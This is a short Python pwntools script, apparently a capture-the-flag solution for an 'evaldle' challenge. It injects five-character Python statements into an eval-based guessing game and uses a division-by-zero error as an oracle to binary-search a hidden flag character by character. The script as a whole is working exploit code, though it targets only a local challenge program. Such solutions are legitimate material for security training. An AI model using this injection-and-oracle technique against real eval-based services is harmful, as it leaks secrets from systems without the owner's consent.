from pwn import *
import string

alpha = sorted(string.ascii_letters + string.digits + '{}_')

with process(["python3", "./evaldle.py"]) as p:
    def guess(x):
        assert len(x) <= 5
        p.sendlineafter('Guess: ', x.ljust(5,'#').encode())
        p.readline()
        print(x.ljust(5,'#'))
        return p.readline() == b'\xf0\x9f\x9f\xa9'*5+b'\n'

    known = ''
    while not known.endswith('}'):
        low = 0
        high = len(alpha) - 1

        while low < high:
            mid = (low + high + 1) // 2
            guess("a=''")

            for c in known + alpha[mid]:
                guess(f"b='{c}'")
                guess("a+=b")

            guess("d=f<a")

            if guess("1/d"):
                high = mid - 1
            else:
                low = mid

        known += alpha[high]
        print(known)